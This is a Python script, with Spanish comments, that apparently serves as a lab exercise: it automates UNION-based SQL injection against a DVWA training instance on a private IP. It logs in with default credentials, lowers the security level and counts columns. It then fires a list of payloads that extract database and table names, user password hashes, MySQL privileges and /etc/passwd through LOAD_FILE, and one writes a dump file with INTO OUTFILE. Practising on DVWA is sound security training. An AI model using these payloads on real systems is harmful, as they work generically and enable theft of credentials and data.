#!/usr/bin/python3
# -*- coding: utf-8 -*-
from clase_preparacion import Preparacion
import requests
from bs4 import BeautifulSoup


def numero_columnas(url_injection, session):
    #url = "http://" + ip + "/dvwa/vulnerabilities/sqli/"

    num_columnas_max = 10  # Cambiar valor si puede que haya más.

    for columna in range(1, num_columnas_max):
        peticion_id = "' ORDER BY " + str(columna) + ' -- -'
        # print(peticion_id)  # Debbug.

        parametros = {"id": peticion_id, "Submit": "Submit"}  # En dificultad LOW.
        #galletas = {"PHPSESSID": "4526f8442a39bcc4b2ce1636d041772a", "security": "low"}  # Debbug.
        galletas = session.cookies


        #session = requests.Session()
        response = requests.get(url_injection, params=parametros, cookies=galletas)

        content_size = int(response.headers['Content-Length'])
        # print(content_size)  # Debbug.
        # print(response.text)  # Debbug.
        if content_size != 4333:
            print(f"Columnas totales = {columna - 1}")
            break

def motor_data_base(url_injection, session):

    parametros = {"id": "' UNION SELECT @@version, null -- -", "Submit": "Submit"}  # LOW
    galletas = session.cookies

    response = requests.get(url_injection, params=parametros, cookies=galletas)
    print(response.text)


def cambio_dificultad():
    # URL de la página de inicio de sesión.
    login_url = 'http://192.168.23.141/dvwa/login.php'

    # Datos del formulario de inicio de sesión.
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login'
    }

    # Realizar la solicitud de inicio de sesión.
    session = requests.Session()
    session.post(login_url, data=login_data)

    # URL de la página de configuración de seguridad.
    security_url = 'http://192.168.23.141/dvwa/security.php'

    # Datos para cambiar la dificultad a "low"
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit'
    }

    # Realizar la solicitud para cambiar la dificultad a "low".
    response = session.post(security_url, data=security_data)

    # Verificar si la solicitud fue exitosa.
    if response.status_code == 200:
        '''
        print('La dificultad se cambió a "low"')
        cookies = session.cookies
        for cookie in cookies:
            print(cookie.name, ':', cookie.value)
        '''
    else:
        print('Hubo un error al cambiar la dificultad')
    return session

def limpiaCampos(listaCampos):
    first_name_field = listaCampos.split('First name')[1].split('Surname')[0].replace(': ', '')
    surname_field = listaCampos.split('Surname')[1].replace(': ', '')
    return first_name_field, surname_field

def injection(url, payload, session):

    parametros = {"id": "' " + payload + " -- -", "Submit": "Submit"}

    galletas = session.cookies

    response = requests.get(url, params=parametros, cookies=galletas)

    html = response.text

    # Crear un objeto BeautifulSoup a partir del contenido HTML
    soup = BeautifulSoup(html, 'html.parser')

    # Encontrar todos los elementos <pre> dentro del elemento con la clase 'vulnerable_code_area'
    pre_elements = soup.select('.vulnerable_code_area pre')

    valor_campos_list = []

    for elemento in pre_elements:
        valor_campos_list.append(limpiaCampos(elemento.get_text()))

    print(valor_campos_list)


if __name__ == '__main__':

    payloads_2 = {'Tecnologia': "UNION SELECT @@version, database()",
                  'Todas_data_bases': ' UNION SELECT schema_name, null FROM information_schema.schemata',
                  'Tablas': "UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'dvwa'",
                  'Usuario': "UNION SELECT user(), database()",
                  'Columnas': "UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users'",
                  'Privilegios': "UNION SELECT privilege_type, is_grantable FROM information_schema.schema_privileges",
                  # extraer los nombres de las tablas del esquema (information_schema)
                  'tablas_esquema': "UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'information_schema'",
                  'user_pass_dvwa': "UNION SELECT user, password FROM users",
                  'Dumpear': "UNION SELECT user, password INTO OUTFILE 'dump.sql' FROM users",
                  'Passwd': "UNION SELECT NULL, LOAD_FILE('/etc/passwd')",
                  'File_dump': "UNION SELECT NULL, LOAD_FILE('/var/lib/mysql/dvwa/dump.sql')",
                  'Usuarios_host': "UNION SELECT user, host FROM mysql.user",
                  'Permisos_usuario': "UNION SELECT Grant_priv, Super_priv FROM mysql.user WHERE user = 'root'",  # Usuarios: debian-sys-maint - guest - root
                }

    ip = '192.168.23.141'
    url_injection = "http://" + ip + "/dvwa/vulnerabilities/sqli/"
    lasession = cambio_dificultad()

    for i in payloads_2.keys():
        print(i)
        injection(url_injection, payloads_2[i], lasession)
